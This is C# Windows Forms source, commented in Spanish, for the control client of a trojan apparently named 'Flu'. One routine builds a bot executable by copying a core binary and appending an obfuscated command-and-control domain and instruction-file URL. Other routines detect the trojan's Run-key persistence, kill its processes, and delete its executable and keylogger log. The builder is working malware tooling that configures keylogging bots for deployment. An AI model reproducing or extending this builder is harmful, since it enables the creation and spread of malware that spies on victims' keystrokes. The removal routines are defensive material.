using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

namespace Cliente
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        #region Constantes utilizadas
        public const string rutaRegistroEjecutableFlu = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        public const string nombreInicialFlu = "flu";
        public const string EXEKEY = "win32";
        #endregion

        /// <summary>
        /// Crea un bot, partiendo del ejecutable con el núcleo y añadiendo al final del mismo la información del dominio y XML
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            //Se realiza una copia del ejecutable de Flu
            string filepath = string.Empty;
            SaveFileDialog saveDlg = new SaveFileDialog();
            {
                saveDlg.FileName = "flu.exe";
                saveDlg.Filter = "Executable Files (*.exe)|*.exe";

                if (saveDlg.ShowDialog() == DialogResult.OK)
                    filepath = saveDlg.FileName;
                else
                    return;
            }

            OpenFileDialog oFD = new OpenFileDialog();
            oFD.Filter = "Ficheros exe (*.exe)|*.exe";
            oFD.FileName = "flu-nucleo.exe";
            if (oFD.ShowDialog() == DialogResult.OK)
            {
               File.Copy(oFD.FileName, filepath,true);
            }
            
            //Se añade la información del dominio y la ruta del fichero del XML en el propio exe
            string split = "-||-";
            string info = split + XMorEncryptText("http://" + textBox1.Text.Replace("http://", "") + "¬" + "http://" + textBox2.Text.Replace("http://", "")) + split;

            FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
            {                
                BinaryWriter bw = new BinaryWriter(fs);
                fs.Position = fs.Length + 1;
                bw.Write(info);
                bw.Close();
            }

            MessageBox.Show("¡Bot creado!");
        }
        
        /// <summary>
        /// Cifra la información del dominio y XML que se ocultará al final del exe del bot
        /// </summary>
        /// <param name="ClearText">Dominio y XML concatenados</param>
        /// <returns></returns>
        public string XMorEncryptText(string ClearText)
        {
            try
            {                
                string output = string.Empty;                
                Random keyGen = new Random(int.MaxValue - (int)(int.MaxValue * 0.2333));                
                foreach (char c in ClearText)
                {                    
                    int cByte = (int)Convert.ToByte(c);                    
                    output += (cByte * keyGen.Next(10000)).ToString() + "~";                    
                }                
                return output.Remove(output.Length - 1, 1);
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
            return null;
        }

        /// <summary>
        /// Actualiza el textbox con la URL donde se encuentra el XML con las instrucciones dependiendo del dominio
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            textBox2.Text = "http://" + textBox1.Text.Replace("http://","") + "/wee.xml";
        }

        /// <summary>
        /// Comprueba si la máquina se encuentra infectada por Flu
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button3_Click(object sender, EventArgs e)
        {
            label4.Text = "No estás infectado por Flu";
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(rutaRegistroEjecutableFlu, true);
            String[] claves = rk1.GetValueNames();
            foreach (String c in claves)
            {
                if (c.Equals("win32"))
                {
                    label4.Text = "Estás infectado por Flu";
                    break;
                }
            }
            rk1.Close();
        }

        /// <summary>
        /// Elimina todos los rastros de Flu de la máquina
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            //Recuperar del registro los nombres del ejecutable (tras el primer reinicio) y del fichero del keylogger
            string pathEjecutable = getKeyValue(EXEKEY);
            
            //Recuperamos el nombre alternativo de Flu
            string[] cadena = pathEjecutable.Split('\\');
            string nombreAlternativoFlu = cadena[cadena.Length - 1].Replace(".exe", "");

            //Mata los procesos de Flu que haya arrancados
            killProc(nombreInicialFlu, nombreAlternativoFlu);

            //Elimina las claves del registro que permiten a Flu iniciarse con el sistema
            deleteKey(EXEKEY);

            //Elimina los archivos de Flu
            while(FileExist(pathEjecutable))
                deleteFile(pathEjecutable);
            string pathKeylogger = pathEjecutable.Replace(".exe", ".txt");
            while (FileExist(pathKeylogger))
                deleteFile(pathKeylogger);

            label1.Text = "¡Estás limpio!";
        }

        /// <summary>
        /// Devuelve el valor de la clave pasada por cabecera
        /// </summary>
        /// <param name="rKey">Clave del registro</param>
        /// <returns></returns>
        private string getKeyValue(string rKey)
        {
            string value = string.Empty;
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(rutaRegistroEjecutableFlu, true);
            String[] claves = rk1.GetValueNames();
            foreach (String c in claves)
            {
                if (c.Equals(rKey))
                {
                    //Borramos entrada de Flu en el registro
                    try
                    {
                        value= rk1.GetValue(c).ToString();
                    }
                    catch { }
                    break;
                }
            }
            rk1.Close();
            return value;
        }

        /// <summary>
        /// Elimina una clave del registro
        /// </summary>
        /// <param name="rkey">Clave del registro a eliminar</param>
        private void deleteKey(string rkey)
        {
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey(rutaRegistroEjecutableFlu, true);
            String[] claves = rk1.GetValueNames();
            foreach (String c in claves)
            {
                if (c.Equals(rkey))
                {
                    //Borramos entrada de Flu en el registro
                    try
                    {
                        rk1.DeleteValue(c);
                    }
                    catch { }
                    break;
                }
            }
            rk1.Close();
        }

        /// <summary>
        /// Elimina un fichero
        /// </summary>
        /// <param name="path">Ruta del fichero</param>
        private void deleteFile(string path)
        {
            try{System.IO.File.Delete(path);}catch { }
        }
        /// <summary>
        /// Determina si existe el fichero pasado por cabecera
        /// </summary>
        /// <param name="path">Devuelve True si existe el fichero, False en caso contrario</param>
        private bool FileExist(string path)
        {
            return System.IO.File.Exists(path);
        }

        /// <summary>
        /// Mata todos los procesos de Flu
        /// </summary>
        /// <param name="nombreFlu">Nombre inicial de Flu</param>
        /// <param name="nombreFluAlternativo">Nombre de Flu tras el reinicio (es creado aleatoriamente durante la infección)</param>
        private void killProc(string nombreFlu, string nombreFluAlternativo)
        {
            foreach (Process proceso in Process.GetProcesses())
            {
                if ((proceso.ProcessName == nombreFlu) || (proceso.ProcessName == nombreFluAlternativo))
                {
                    try{proceso.Kill();}catch { }
                }
            }
        }
    }
}
